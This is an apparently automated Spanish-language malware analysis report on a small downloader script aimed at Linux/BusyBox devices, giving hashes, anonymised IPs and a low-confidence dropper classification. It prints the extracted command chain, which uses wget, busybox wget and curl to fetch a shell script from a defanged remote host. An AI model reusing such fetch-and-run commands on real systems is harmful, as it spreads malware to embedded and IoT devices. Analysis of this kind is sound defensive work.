# 🧬 Payload Analysis

`a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932`

## 📌 Resumen

Texto ASCII de 469 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `rondo` en `hxxp://45.153.34.XXX/rondo`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget -qO- hxxp://45.153.34.XXX/rondo.''dgx.sh`
2. `busybox wget -qO- hxxp://45.153.34.XXX/rondo.''dgx.sh`
3. `curl -s hxxp://45` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932.md](../../../../../malware-like/oraculo/downloader/a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932`
- **MD5:** `5fea9b013d866f08ed4f84681e0ab625`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 469 B |
| Entropía | 5.29 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
(wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh||busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh||curl -s hxxp://45
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://45.153.34.XXX/rondo. | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 45.153.34.XXX | static_analysis |
| command | (wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh\|\|busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh\|\|curl -s hxxp://45 | strings |
| hash | a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932 | static_analysis |
| ip | 94.154.43.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
